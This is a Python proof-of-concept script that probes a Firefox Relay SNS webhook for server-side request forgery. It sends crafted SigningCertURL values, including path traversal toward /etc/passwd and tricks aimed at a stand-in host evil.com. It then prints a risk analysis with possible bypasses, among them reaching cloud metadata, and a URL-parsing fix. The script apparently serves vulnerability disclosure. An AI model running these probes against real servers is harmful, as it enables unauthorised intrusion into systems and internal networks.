"""
PoC: SNS Webhook SSRF — Mozilla Firefox Relay

Target:      POST /emails/sns-inbound
Sink:        emails/sns.py:135 — urlopen(cert_url)
Guard:       emails/sns.py:121 — startswith() prefix check

The SigningCertURL field from the unauthenticated POST body reaches
urlopen() before any signature verification. The only defense is a
string prefix check that locks the hostname to sns.{region}.amazonaws.com.

The urlopen() call executes BEFORE verify() checks the signature, so
even a completely invalid payload triggers the network request.

Usage:
    python3 fx-relay-sns-ssrf-poc.py <target_url>
    python3 fx-relay-sns-ssrf-poc.py http://localhost:8000
"""

import requests
import json
import sys

WEBHOOK_PATH = "/emails/sns-inbound"


def build_payload(signing_cert_url: str) -> dict:
    return {
        "Type": "Notification",
        "MessageId": "poc-attack-surface-demo",
        "TopicArn": "arn:aws:sns:us-east-1:000000000000:test",
        "Subject": "SSRF Probe",
        "Message": json.dumps({"test": "data"}),
        "Timestamp": "2026-06-24T00:00:00.000Z",
        "SignatureVersion": "1",
        "Signature": "INVALID_SIGNATURE_TO_TRIGGER_EARLY_URLOPEN",
        "SigningCertURL": signing_cert_url,
    }


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"  e.g.: {sys.argv[0]} http://localhost:8000")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")
    webhook_url = f"{target}{WEBHOOK_PATH}"

    print("=" * 60)
    print("Mozilla Firefox Relay — SNS Webhook SSRF PoC")
    print("=" * 60)

    # Test 1: Verify the endpoint responds
    print("\n[Test 1] Endpoint reachability check ...")
    try:
        resp = requests.post(webhook_url, timeout=10)
        print(f"  Status: {resp.status_code}")
    except requests.exceptions.ConnectionError:
        print(f"  Cannot reach {target} — is the server running?")
        print(f"  Tip: use --new-pipeline or local deployment")
        sys.exit(1)

    # Test 2: SSRF probe — the urlopen will trigger even with bad signature
    print("\n[Test 2] SSRF probe via SigningCertURL ...")
    print("  The urlopen(cert_url) fires BEFORE signature verification.")
    print("  Guard check: cert_url.startswith('https://sns.{region}.amazonaws.com/')")
    print()

    # Case A: URL passes startswith but goes to attacker-controlled
    # This is the key question: can we change the host while passing the prefix check?
    test_urls = [
        # Normal (expected) — passes check, goes to SNS
        ("normal", "https://sns.us-east-1.amazonaws.com/valid-cert.pem", True),
        # Path traversal — passes check, but stays on SNS host
        ("path-traversal", "https://sns.us-east-1.amazonaws.com/../../../etc/passwd", True),
        # Fragment injection — passes check, fragment not sent
        ("fragment", "https://sns.us-east-1.amazonaws.com/cert#@evil.com", True),
        # Query params — passes check, on SNS host
        ("query-injection", "https://sns.us-east-1.amazonaws.com/cert?test=1", True),
        # Host override via URL encoding — FAILS check (host becomes evil.com)
        ("backslash-host", "https://sns.us-east-1.amazonaws.com\\\\@evil.com/cert", False),
        # URL with port — FAILS check
        ("port-spec", "https://sns.us-east-1.amazonaws.com:443/cert", False),
    ]

    for name, url, expects_pass in test_urls:
        payload = build_payload(url)
        try:
            resp = requests.post(webhook_url, json=payload, timeout=5)
            print(f"  [{name:20s}] SigningCertURL={url}")
            print(f"    startswith guard: {'PASS' if expects_pass else 'FAIL'}")
            print(f"    HTTP Status: {resp.status_code}  Response: {resp.text[:80]}")
        except requests.exceptions.Timeout:
            print(f"  [{name:20s}] TIMEOUT — urlopen likely blocked/hung")
        except Exception as e:
            print(f"  [{name:20s}] Error: {e}")
        print()

    # Analysis
    print("=" * 60)
    print("ANALYSIS")
    print("=" * 60)
    print("""
  Risk: MEDIUM (guarded but architecturally weak)

  The startswith() guard with trailing slash ('/') prevents direct
  hostname hijacking:
    - 'https://sns.us-east-1.amazonaws.com/@evil.com' → path on SNS host
    - 'https://sns.us-east-1.amazonaws.com\\\\@evil.com' → fails startswith

  However, the defense has architectural concerns:
    1. STRING-based, not URL-parsed — any URL parsing differential
       between startswith() and urllib eliminates the guard.
    2. urlopen() fires before signature verification — no auth needed.
    3. Endpoint is @csrf_exempt with no authentication.
    4. urllib.request.urlopen follows redirects by default (301/302/303/307/308).

  Potential bypass scenarios (not confirmed exploitable today):
    - DNS rebinding on sns.{region}.amazonaws.com
    - Open redirect vulnerability on AWS SNS infrastructure
    - URL parsing differential in future Python/urllib versions
    - Injecting into AWS_REGION setting (unlikely from user input)

  If the guard is bypassed (via any of the above), the impact is full
  SSRF: the attacker can probe internal cloud metadata endpoints
  (169.254.169.254), internal services, and other cloud resources.

  Mitigation:
    Replace startswith() with proper URL parsing:
      parsed = urlparse(cert_url)
      if parsed.hostname != f"sns.{settings.AWS_REGION}.amazonaws.com":
          raise SuspiciousOperation(...)
      if parsed.scheme != "https":
          raise SuspiciousOperation(...)
    """)

    print("=" * 60)
    print("DISCLAIMER: This PoC demonstrates attack surface only.")
    print("Unauthorized testing against production systems is illegal.")
    print("=" * 60)


if __name__ == "__main__":
    main()
